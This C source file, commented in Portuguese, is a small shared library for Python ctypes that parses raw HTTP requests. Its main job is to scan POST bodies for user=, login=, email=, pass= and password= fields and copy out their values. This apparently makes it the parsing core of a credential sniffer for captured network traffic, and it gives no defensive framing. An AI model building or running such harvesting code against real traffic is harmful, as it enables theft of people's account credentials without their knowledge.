/*
 * http_parser.c  —  Parser HTTP minimalista para ctypes
 *
 * Compilar no Windows (MinGW):
 *   gcc -O2 -shared -o http_parser.dll http_parser.c
 *
 * Compilar no Windows (MSVC):
 *   cl /O2 /LD http_parser.c /Fe:http_parser.dll
 *
 * Compilar no Linux/macOS:
 *   gcc -O2 -shared -fPIC -o http_parser.so http_parser.c
 *
 * Exporta apenas parse_http_request() — chamada via ctypes.
 */

#include <stdint.h>
#include <string.h>

/* Tamanhos máximos dos campos de saída (incluindo '\0') */
#define MAX_METHOD   16
#define MAX_RESOURCE 512
#define MAX_CRED_KEY 64
#define MAX_CRED_VAL 128
#define MAX_CREDS    8

typedef struct {
    char method[MAX_METHOD];        /* "GET", "POST", ... ou "" se não HTTP */
    char resource[MAX_RESOURCE];    /* "/caminho?query" */
    int  is_http;                   /* 1 se request HTTP válido */
    int  cred_count;                /* número de credenciais encontradas */
    char cred_keys[MAX_CREDS][MAX_CRED_KEY];
    char cred_vals[MAX_CREDS][MAX_CRED_VAL];
} HttpResult;

/* ------------------------------------------------------------------ */
/* Utilitários internos                                                 */
/* ------------------------------------------------------------------ */

static int starts_with(const uint8_t *buf, int len, const char *prefix)
{
    int plen = (int)strlen(prefix);
    if (len < plen) return 0;
    return memcmp(buf, prefix, plen) == 0;
}

static int is_http_method(const uint8_t *buf, int len)
{
    return starts_with(buf, len, "GET ")    ||
           starts_with(buf, len, "POST ")   ||
           starts_with(buf, len, "PUT ")    ||
           starts_with(buf, len, "DELETE ") ||
           starts_with(buf, len, "HEAD ")   ||
           starts_with(buf, len, "OPTIONS ");
}

/*
 * Copia até dst_max-1 bytes de src[0..src_len) para dst,
 * terminando no delimitador 'delim' ou no fim do buffer.
 * Retorna quantos bytes foram lidos de src (sem o delimitador).
 */
static int copy_until(char *dst, int dst_max,
                       const uint8_t *src, int src_len,
                       char delim)
{
    int i = 0, w = 0;
    while (i < src_len && src[i] != (uint8_t)delim) {
        if (w < dst_max - 1)
            dst[w++] = (char)src[i];
        i++;
    }
    dst[w] = '\0';
    return i;  /* posição do delimitador (ou src_len se não encontrou) */
}

/*
 * Busca credenciais no corpo do POST.
 * Padrões reconhecidos: user=, login=, email=, pass=, password=
 */
static const char *CRED_KEYS[] = {
    "user=", "login=", "email=", "pass=", "password=", NULL
};

static void extract_credentials(HttpResult *out,
                                  const uint8_t *body, int body_len)
{
    if (out->cred_count >= MAX_CREDS) return;

    for (int ki = 0; CRED_KEYS[ki] != NULL; ki++) {
        const char *key  = CRED_KEYS[ki];
        int         klen = (int)strlen(key);

        /* Busca linear no corpo — body_len tipicamente < 2 KB */
        for (int i = 0; i <= body_len - klen; i++) {
            if (memcmp(body + i, key, klen) != 0) continue;

            /* Encontrou — copia chave (sem '=') */
            int idx = out->cred_count;
            int raw_klen = klen - 1;  /* sem '=' */
            if (raw_klen >= MAX_CRED_KEY) raw_klen = MAX_CRED_KEY - 1;
            memcpy(out->cred_keys[idx], key, raw_klen);
            out->cred_keys[idx][raw_klen] = '\0';

            /* Copia valor até '&', '\r', '\n' ou fim */
            int vi = i + klen, w = 0;
            while (vi < body_len                    &&
                   body[vi] != '&'                  &&
                   body[vi] != '\r'                 &&
                   body[vi] != '\n'                 &&
                   w < MAX_CRED_VAL - 1)
            {
                out->cred_vals[idx][w++] = (char)body[vi++];
            }
            out->cred_vals[idx][w] = '\0';
            out->cred_count++;
            if (out->cred_count >= MAX_CREDS) return;
        }
    }
}

/* ------------------------------------------------------------------ */
/* Função exportada                                                      */
/* ------------------------------------------------------------------ */

#ifdef _WIN32
#  define EXPORT __declspec(dllexport)
#else
#  define EXPORT __attribute__((visibility("default")))
#endif

EXPORT void parse_http_request(const uint8_t *buf, int len, HttpResult *out)
{
    memset(out, 0, sizeof(HttpResult));

    if (!buf || len < 5 || !is_http_method(buf, len))
        return;

    out->is_http = 1;

    /* --- Método --- */
    int pos = copy_until(out->method, MAX_METHOD, buf, len, ' ');
    pos++;  /* pula o espaço */

    /* --- Recurso --- */
    int rlen = copy_until(out->resource, MAX_RESOURCE,
                           buf + pos, len - pos, ' ');
    pos += rlen;

    /* --- Corpo (POST) --- */
    /* Localiza \r\n\r\n */
    for (int i = 0; i < len - 3; i++) {
        if (buf[i]   == '\r' && buf[i+1] == '\n' &&
            buf[i+2] == '\r' && buf[i+3] == '\n')
        {
            int body_start = i + 4;
            if (body_start < len)
                extract_credentials(out, buf + body_start, len - body_start);
            break;
        }
    }
}
